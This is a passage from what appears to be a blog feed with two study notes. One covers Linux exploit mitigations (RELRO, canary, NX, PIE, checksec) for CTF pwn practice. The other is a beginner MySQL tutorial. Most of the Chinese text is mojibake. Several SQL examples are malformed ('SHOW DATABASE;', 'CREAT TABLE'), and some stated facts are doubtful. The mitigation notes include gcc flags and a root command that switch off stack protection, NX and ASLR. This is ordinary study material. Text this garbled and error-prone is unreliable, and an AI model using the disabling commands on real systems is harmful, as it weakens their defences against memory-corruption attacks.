class="headerlink" title="Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶"></a>Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶</h1><p>æ“ä½œç³»ç»Ÿæä¾›äº†è®¸å¤šå®‰å…¨æœºåˆ¶æ¥å°è¯•é™ä½æˆ–é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¸¦æ¥çš„å®‰å…¨é£é™©ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº† ä¿æŠ¤æœºåˆ¶</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>è¿™ä¸æ˜¯ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ä¸ªè„šæœ¬è½¯ä»¶ã€‚</p><p>checksecç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„å±æ€§ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>ä»¥ä¹‹å‰ä¸€é“ Pwn é¢˜é¢˜ç›®ä¸ºä¾‹ï¼š<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>RELROå³ä¸ºread only relocationï¼Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬ç†Ÿæ‚‰çš„windowsç³»ç»Ÿé‡Œçš„åªè¯»ã€‚</p><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹ GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚</p><h4 id="å‚æ•°è®¾ç½®"><a href="#å‚æ•°è®¾ç½®" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO<br>gcc -z norelro -o hello test.c // å…³é—­ï¼Œå³No RELRO<br>gcc -z lazy -o hello test.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO<br>gcc -z now -o hello test.c // å…¨éƒ¨å¼€å¯ï¼Œå³Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰"><a href="#CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰" class="headerlink" title="CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰"></a>CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰</h3><h4 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®© shellcode èƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥ cookie ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°† cookie ä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢ shellcode çš„æ‰§è¡Œã€‚</p><p>åœ¨ Linux ä¸­æˆ‘ä»¬å°† cookie ä¿¡æ¯ç§°ä¸º canaryã€‚</p><h4 id="å‚æ•°è®¾ç½®-1"><a href="#å‚æ•°è®¾ç½®-1" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤<br>gcc -fstack-protector-all å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit åªå¯¹æœ‰æ˜ç¡®stack_protect attribute çš„å‡½æ•°å¼€å¯ä¿æŠ¤<br>gcc -fno-stack-protector ç¦ç”¨ä¿æŠ¤<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>NX å³ No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥ shellcode æ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶ CPU å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><h4 id="å‚æ•°è®¾ç½®-2"><a href="#å‚æ•°è®¾ç½®-2" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><p>gcc ç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº† NX é€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­ NX é€‰é¡¹ï¼Œå¯ä»¥ç»™ gcc ç¼–è¯‘å™¨æ·»åŠ  - z execstack å‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤<br>gcc -z execstack -o test test.c        // ç¦ç”¨NXä¿æŠ¤<br>gcc -z noexecstack -o test test.c    // å¼€å¯NXä¿æŠ¤<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="ä»‹ç»-4"><a href="#ä»‹ç»-4" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>PIEå³Position-Independent Executableï¼ˆ ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼Œä¸ASLR æŠ€æœ¯ç±»ä¼¼ã€‚</p><p>ASLR å°†ç¨‹åºè¿è¡Œæ—¶çš„å †æ ˆä»¥åŠå…±äº«åº“çš„åŠ è½½åœ°å€éšæœºåŒ–ï¼Œè€Œ PIE æŠ€æœ¯åˆ™åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³ï¼Œå³ç¨‹åºè¿è¡Œæ—¶å„ä¸ªæ®µï¼ˆå¦‚ä»£ç æ®µç­‰ï¼‰åŠ è½½çš„è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯åœ¨è£…è½½æ—¶æ‰ç¡®å®šã€‚</p><p>è¿™å°±æ„å‘³ç€ï¼Œåœ¨ PIE å’Œ ASLR åŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œä¼ ç»Ÿçš„æ”¹å†™GOT è¡¨é¡¹çš„æ–¹æ³•ä¹Ÿéš¾ä»¥è¿›è¡Œï¼Œå› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¨‹åºçš„.got æ®µçš„è™šåœ°å€ã€‚</p><p>liunx ä¸‹å…³é—­ PIE çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="å‚æ•°è®¾ç½®-3"><a href="#å‚æ•°è®¾ç½®-3" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE<br>gcc -fpie -pie -o test test.c        // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1<br>gcc -fPIE -pie -o test test.c        // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2<br>gcc -fpic -o test test.c        // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE<br>gcc -fPIC -o test test.c        // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE<br></code></pre></td></tr></table></figure><hr><p>æ‚ä¸ƒæ‚å…«å¿™äº†ä¸€ä¸ªå‘¨ï¼ŒæŠ½æ—¶é—´å­¦äº†è¿™ä¹ˆç‚¹ä¸œè¥¿ã€‚æˆ‘æ˜¯èœé¸¡ğŸ¥¬</p><p>æœ‰çœ‹å‡ é“pwné¢˜ï¼Œå‘ç°å¤§éƒ¨åˆ†é¢˜ç›®éƒ½æ˜¯éœ€è¦ä¸€äº›é€†å‘æŠ€å·§çš„ï¼Œæœ‰äº›è¿˜ä¼šå’Œwebç»“åˆ <del>éå¸¸ç–¯ç‹‚</del></p><p>å¦‚æœæœ‰ç©ºwebä¸€äº›åŸºç¡€çš„ä¸œè¥¿æˆ‘è¿˜æ˜¯ä¼šç»§ç»­å­¦çš„ï¼Œå°±ç†¬å¤œå§ç†¬å¤œå§ğŸ¤ª</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ubuntu</tag>
      
      <tag>x86æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQLæ•°æ®åº“åŸºç¡€</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>åˆåï¼šå­¦äº†å°±å¿˜åªèƒ½å†çœ‹ä»å¤´é‡å­¦ğŸ˜£</p><span id="more"></span><h1 id="01-phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨"><a href="#01-phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨" class="headerlink" title="01 phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨"></a>01 phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨</h1><p>åœ¨å­¦ç”¨MySQLçš„æ—¶å€™å‘ç°è‡ªå·±å’Œå­¦ä¹ èµ„æ–™ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªé›†æˆç¯å¢ƒï¼Œæ‰€ä»¥æ‰“å¼€æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™ç§å°é—®é¢˜è¿˜æ˜¯éš¾ä¸å€’æˆ‘å“’ğŸ˜</p><p>é¦–å…ˆå¼€å¯MySQLæœåŠ¡    <del>å¥½äº†æ¥ä¸‹æ¥å°±ä¸ä¼šäº†</del></p><p>å†å»å°çš®å®˜ç½‘çœ‹çœ‹</p><p>æœ‰ä¸€ä¸ªæ¨¡å—æ˜¯phpMyAdminçš„ä½¿ç”¨ã€‚æŒ‰ç…§å®˜æ–¹æ•™ç¨‹ä¸‹è½½å¥½æ‰“å¼€æˆ‘æ‰å‘ç°è¿™æ˜¯åœ¨ç½‘é¡µä¸Šæ“ä½œï¼Œä¸æ˜¯å‘½ä»¤è¡Œã€‚æ²¡å…³ç³»ï¼Œä¸‹è½½éƒ½ä¸‹è½½äº†ï¼Œå­¦ä¹ ä¸€ä¸‹ã€‚</p><h4 id="001-å›¾å½¢åŒ–ç•Œé¢æ“ä½œ"><a href="#001-å›¾å½¢åŒ–ç•Œé¢æ“ä½œ" class="headerlink" title="001 å›¾å½¢åŒ–ç•Œé¢æ“ä½œ"></a>001 å›¾å½¢åŒ–ç•Œé¢æ“ä½œ</h4><p>åœ¨è½¯ä»¶ç®¡ç†æ‰¾åˆ°<strong>phpMyAdmin</strong>ï¼Œç‚¹å‡»ä¸‹è½½ã€‚ä¸‹è½½å®Œä¹‹åç‚¹ç®¡ç†å°±ä¼šè‡ªåŠ¨åœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥ä½¿ç”¨å•¦ã€‚</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>ç”¨æˆ·åå’Œå¯†ç æ²¡æ”¹è¿‡çš„è¯å°±éƒ½æ˜¯<strong>root</strong></p><p>åœ¨phpMyAdminä¹Ÿå¯ä»¥ç”¨SQLæŸ¥è¯¢è¯­å¥å—·</p><blockquote><p>è¾“å…¥SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>ä½¿ç”¨å…¶ä»–ç•Œé¢æ“ä½œå†…å®¹æ—¶ä¹Ÿå¯ä»¥é¢„è§ˆSQLè¯­å¥</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>æ€»ä¹‹å°±æ˜¯å¾ˆç®€å•æ˜“ä¸Šæ‰‹è¾£ğŸ˜‡</p><p><del>è¿æˆ‘éƒ½å¯ä»¥æ— å¸ˆè‡ªé€š</del></p><h4 id="002-cmdæ“ä½œ"><a href="#002-cmdæ“ä½œ" class="headerlink" title="002 cmdæ“ä½œ"></a>002 cmdæ“ä½œ</h4><blockquote><p>MySQLåœ¨phpstudy_proæ–‡ä»¶ä¸‹çš„Extensionsæ–‡ä»¶å¤¹é‡Œ</p></blockquote><p>è¿›å…¥binç›®å½•ååœ¨æ­¤å¤„æ‰“å¼€cmd</p><p>è¾“å…¥<code>mysql -u[ç”¨æˆ·å] -p[å¯†ç ] -h [æ•°æ®åº“æœåŠ¡å™¨åœ°å€]</code>è¿›å…¥</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>ç”¨æˆ·åå’Œå¯†ç æ²¡æ”¹è¿‡çš„è¯å°±éƒ½æ˜¯<strong>root</strong>ï¼Œæ‰“å¼€æœ¬åœ°æ•°æ®åº“å¯ä»¥ä¸åŠ æœåŠ¡å™¨åœ°å€</p><p>è¿›å…¥mysqlä¹‹åå°±å¯ä»¥å¿«ä¹ä½¿ç”¨äº†</p><h1 id="02-å…³äºMySQL"><a href="#02-å…³äºMySQL" class="headerlink" title="02 å…³äºMySQL"></a>02 å…³äºMySQL</h1><h4 id="001-MySQLå¸¸è§ç¬¦å·"><a href="#001-MySQLå¸¸è§ç¬¦å·" class="headerlink" title="001 MySQLå¸¸è§ç¬¦å·"></a>001 MySQLå¸¸è§ç¬¦å·</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>è¡¨ç¤ºå½“å‰å‘½ä»¤æ²¡æœ‰å‘½ä»¤æ‰§è¡Œç¬¦æˆ–è€…ç­‰å¾…å‘½ä»¤æ‰§è¡Œç¬¦<code>;</code>æˆ–<code>\g</code>ï¼Œä¹Ÿå¯ä»¥è¾“å…¥<code>\c</code>å–æ¶ˆå‘½ä»¤ç›´æ¥è¾“å…¥<code>;</code>å›è½¦å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h5 id="â€˜-gt-æˆ–â€-gt"><a href="#â€˜-gt-æˆ–â€-gt" class="headerlink" title="â€˜&gt;æˆ–â€&gt;"></a>â€˜&gt;æˆ–â€&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>è¡¨ç¤ºå½“å‰å‘½ä»¤ç¼ºå°‘<code>&#39;</code>æˆ–<code>&quot;</code></p><h4 id="002-MySQLç¼–ç è§„èŒƒ"><a href="#002-MySQLç¼–ç è§„èŒƒ" class="headerlink" title="002 MySQLç¼–ç è§„èŒƒ"></a>002 MySQLç¼–ç è§„èŒƒ</h4><ul><li><p>å…³é”®å­—ä¸å‡½æ•°åç§°å…¨éƒ¨å¤§å†™ï¼›ï¼ˆä¸å¤§å†™ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼‰</p></li><li><p>æ•°æ®åº“åç§°ã€è¡¨åã€å­—æ®µåç§°å…¨éƒ¨å°å†™ï¼›</p></li><li><p>å¿…é¡»ä»¥åˆ†å·ç»“å°¾</p></li></ul><h4 id="003-ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€"><a href="#003-ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€" class="headerlink" title="003 ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€"></a>003 ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€</h4><p>ä¸»è¦åˆ†ä¸ºå››ç±»</p><p>DDL-æ•°æ®åº“å®šä¹‰è¯­è¨€ï¼ˆCREATE DROP ALTER)</p><p>DML-æ•°æ®åº“æ“ä½œè¯­è¨€ï¼ˆINSERT DELETE UPDATE)</p><p>DQL-æ•°æ®åº“æŸ¥è¯¢è¯­è¨€ï¼ˆSELECT WHERE)</p><p>DCL-æ•°æ®åº“æ§åˆ¶è¯­è¨€</p><p><del>è¯´äº†è¿™ä¹ˆå¤šä¹Ÿæ²¡ä»€ä¹ˆç”¨</del>ğŸ¤ª</p><h1 id="03-SQLè¯­æ³•"><a href="#03-SQLè¯­æ³•" class="headerlink" title="03 SQLè¯­æ³•"></a>03 SQLè¯­æ³•</h1><h3 id="å¯¹åº“çš„æ“ä½œ"><a href="#å¯¹åº“çš„æ“ä½œ" class="headerlink" title="å¯¹åº“çš„æ“ä½œ"></a>å¯¹åº“çš„æ“ä½œ</h3><h5 id="æŸ¥æ‰¾åº“"><a href="#æŸ¥æ‰¾åº“" class="headerlink" title="æŸ¥æ‰¾åº“"></a>æŸ¥æ‰¾åº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="åˆ›å»ºåº“"><a href="#åˆ›å»ºåº“" class="headerlink" title="åˆ›å»ºåº“"></a>åˆ›å»ºåº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“å³å°†åˆ›å»ºçš„åº“æ˜¯å¦å­˜åœ¨æ—¶ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼šå¦‚æœåº“ä¸å­˜åœ¨å°±åˆ›å»ºï¼Œå­˜åœ¨åˆ™é€€å‡ºå‘½ä»¤</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>ä½†ä¸å»ºè®®è®©MySQLæ¥åšåˆ¤æ–­</p></blockquote><h5 id="åˆ é™¤åº“"><a href="#åˆ é™¤åº“" class="headerlink" title="åˆ é™¤åº“"></a>åˆ é™¤åº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åº“ä¸èƒ½ä¿®æ”¹åå­—</strong></p><h3 id="å¯¹è¡¨çš„æ“ä½œ"><a href="#å¯¹è¡¨çš„æ“ä½œ" class="headerlink" title="å¯¹è¡¨çš„æ“ä½œ"></a>å¯¹è¡¨çš„æ“ä½œ</h3><h5 id="æŸ¥æ‰¾è¡¨"><a href="#æŸ¥æ‰¾è¡¨" class="headerlink" title="æŸ¥æ‰¾è¡¨"></a>æŸ¥æ‰¾è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //æŸ¥æ‰¾å½“å‰åº“çš„æ‰€æœ‰è¡¨<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" title="åˆ›å»ºè¡¨"></a>åˆ›å»ºè¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [æ•°æ®ç±»å‹] [åˆ—çš„å®Œæ•´æ€§çº¦æŸ]ï¼Œ<br>    Â·Â·Â·Â·Â·Â·<br>);<br></code></pre></td></tr></table></figure><blockquote><p>nameä¸ºåˆ›å»ºçš„è¡¨æ ¼åï¼Œå¯è‡ªè¡Œæ›´æ”¹</p><p>ç©ºæ ¼é‡Œå¡«è¡¨æ ¼è¡¨å¤´åŠæ•°æ®ä¿¡æ¯</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>åˆ›å»ºæ–°è¡¨åï¼Œå¯ä»¥ä½¿ç”¨<code>desc table_name</code>æŸ¥è¯¢è¡¨æ ¼ä¿¡æ¯</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>æ•°æ®ç±»å‹</p><table><thead><tr><th>æ•°æ®ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Int</td><td>æ•´æ•°ç±»å‹</td></tr><tr><td>char(n)</td><td>å­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼Œå›ºå®šé•¿åº¦</td></tr><tr><td>varchar(n)</td><td>å­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼Œå¯å˜é•¿åº¦ï¼Œæœ€å¤§é•¿åº¦ä¸ºn</td></tr><tr><td>numeric(a,b)</td><td>ç²¾ç¡®æ•°å€¼ï¼Œæ€»ä½æ•°ä¸ºaï¼Œç²¾ç¡®åˆ°å°æ•°ç‚¹åç¬¬bä½</td></tr><tr><td>date</td><td>æ—¶é—´ï¼Œå­˜å‚¨å¹´æœˆæ—¥çš„å€¼</td></tr></tbody></table><p>å­—æ®µçº¦æŸ</p><table><thead><tr><th>çº¦æŸç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>åªèƒ½ç”¨äºæ•°å€¼æ•´å‹ï¼Œè®¾ç½®æ— ç¬¦å·ã€‚æœ€å¤§å€¼ä¸èƒ½è¶…è¿‡255</td></tr><tr><td>ZEROFILL</td><td>åªèƒ½ç”¨äºæ•°å€¼æ•´å½¢ï¼Œè‡ªåŠ¨ç”¨0è¡¥å…¨ä¸è¶³ä½æ•°ã€‚egï¼š001</td></tr><tr><td>AUTO_INCREMENT</td><td>è®¾ç½®å­—æ®µçš„è‡ªåŠ¨å¢é‡å±æ€§ï¼Œåªèƒ½ç”¨äºè®¾ç½®æ•°å€¼ç±»å‹ã€‚</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>é»˜è®¤ä¸ºNULLï¼Œå³æ²¡æœ‰åœ¨æ­¤å­—æ®µæ’å…¥å€¼ã€‚å¦‚æœè®¾ç½®NOT NULLï¼Œåˆ™å¿…é¡»åœ¨æ­¤å­—æ®µæ’å…¥ç›¸åº”çš„å€¼ã€‚</td></tr><tr><td>DEFAULT</td><td>é€šè¿‡æ­¤å±æ€§è®¾ç½®é»˜è®¤å€¼</td></tr><tr><td>PRIMARY KEY</td><td>ä¸»é”®çº¦æŸï¼Œä¸»é”®è‡ªåŠ¨ä¸ºNOT NULLã€‚</td></tr></tbody></table><blockquote><p>AUTO_INCREMENTå¿…é¡»å’ŒPRIMARY KEYä¸€èµ·ç”¨ã€‚è‡ªåŠ¨å¢é‡å¿…é¡»ä¸ºä¸»é”®ï¼Œä½†ä¸»é”®ä¸ä¸€å®šè¦è‡ªåŠ¨å¢é‡ã€‚</p></blockquote><h5 id="å¤‡ä»½è¡¨"><a href="#å¤‡ä»½è¡¨" class="headerlink" title="å¤‡ä»½è¡¨"></a>å¤‡ä»½è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="ä¿®æ”¹è¡¨"><a href="#ä¿®æ”¹è¡¨" class="headerlink" title="ä¿®æ”¹è¡¨"></a>ä¿®æ”¹è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="å¯¹å­—æ®µçš„æ“ä½œ"><a href="#å¯¹å­—æ®µçš„æ“ä½œ" class="headerlink" title="å¯¹å­—æ®µçš„æ“ä½œ"></a>å¯¹å­—æ®µçš„æ“ä½œ</h3><h5 id="æ·»åŠ å­—æ®µ"><a href="#æ·»åŠ å­—æ®µ" class="headerlink" title="æ·»åŠ å­—æ®µ"></a>æ·»åŠ å­—æ®µ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [æ•°æ®ç±»å‹] [å®Œæ•´æ€§çº¦æŸ] [ä½ç½®å‚æ•°];<br></code></pre></td></tr></table></figure><blockquote><p>ä½ç½®å‚æ•°å¯ç©ºé»˜è®¤åŠ 